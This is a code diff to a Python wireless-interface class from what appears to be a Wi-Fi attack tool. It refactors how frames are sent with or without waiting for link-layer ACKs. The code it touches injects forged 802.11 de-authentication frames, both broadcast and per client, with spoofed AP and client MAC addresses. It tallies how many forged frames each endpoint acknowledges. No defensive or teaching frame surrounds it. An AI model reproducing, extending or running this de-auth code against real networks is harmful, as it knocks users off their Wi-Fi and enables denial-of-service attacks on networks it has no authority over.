@@ -673,6 +673,22 @@ class WlanInterface:
         logger.warning(f"Driver for {self._chipset} does not support injection.")
         return False
 
+    #: Fixed link-ACK wait: an 802.11 ACK returns within SIFS (~10 µs); 20 ms covers
+    #: USB/RX-tap latency with wide margin. One window for every ACK we ever wait for.
+    MAX_ACK_DELAY = 0.02
+
+    async def send_no_wait(self, frame_bytes: bytes, *, use_no_ack: bool = True) -> bool:
+        """Inject a frame fire-and-forget — no ACK wait, no resend."""
+        return await self.send_raw(frame_bytes, use_no_ack=use_no_ack)
+
+    async def send_until_ack(self, frame_bytes: bytes, max_retries: int = 0, *,
+                             use_no_ack: bool = True) -> bool:
+        """Inject a frame and wait up to ``MAX_ACK_DELAY`` for the AP's link-ACK, resending
+        up to ``max_retries`` times on silence; returns whether it landed. Fire-and-forget
+        unless the driver's TX-ACK detection is armed."""
+        return await self.send_raw(frame_bytes, use_no_ack=use_no_ack,
+                                   wait_for_ack=self.MAX_ACK_DELAY, max_resends=max_retries)
+
     def _record_tx(self, frame_bytes: bytes) -> None:
         """Classify an outgoing frame for the packet dashboard (deauth vs other), reusing
         the RX parser. Wrapped so a malformed inject can't break TX over a cosmetic counter."""
@@ -722,18 +738,18 @@ class WlanInterface:
         frame = self._deauth_frame(bcast, ap_mac, ap_mac, "ff:ff:ff:ff:ff:ff")
         logger.info("Injecting broadcast de-auth (%dx) on CH %d from %s", count, target_chan, ap_bssid)
         for _ in range(count):
-            await self.send_raw(frame, use_no_ack=True)
+            await self.send_no_wait(frame)
             await asyncio.sleep(0.01)
         return count
 
-    async def deauth_client(self, ap_bssid: str, client_bssid: str, rounds: int = 10,
-                            ack_window: float = 0.05) -> DeauthResult:
+    async def deauth_client(self, ap_bssid: str, client_bssid: str,
+                            rounds: int = 10) -> DeauthResult:
         """De-auth one client both ways, measuring how many frames each endpoint ACKed.
 
         AP→Client frames are ACKed by the CLIENT (the ACK's RA is the AP MAC we spoofed as
         sender); Client→AP frames are ACKed by the AP (RA = the client MAC we spoofed). With
         a driver that has TX-ACK detection we arm it, send each frame ACK-gated within
-        ``ack_window`` s, and tally the per-direction landings — no resends, so exactly
+        ``MAX_ACK_DELAY``, and tally the per-direction landings — no resends, so exactly
         ``2*rounds`` frames still go out. Without it we still send, but the result is
         ``measured=False`` and the caller reports no ACK verdict.
 
@@ -755,13 +771,14 @@ class WlanInterface:
         if measure:
             await driver.enable_ack_detect()
         try:
-            w = ack_window if measure else 0.0
             for _ in range(rounds):
-                landed_c = await self.send_raw(client_deauth, use_no_ack=True, wait_for_ack=w)
+                landed_c = await (self.send_until_ack(client_deauth) if measure
+                                  else self.send_no_wait(client_deauth))
                 res.client_sent += 1
                 if measure and landed_c:
                     res.client_acks += 1
-                landed_a = await self.send_raw(ap_deauth, use_no_ack=True, wait_for_ack=w)
+                landed_a = await (self.send_until_ack(ap_deauth) if measure
+                                  else self.send_no_wait(ap_deauth))
                 res.ap_sent += 1
                 if measure and landed_a:
                     res.ap_acks += 1
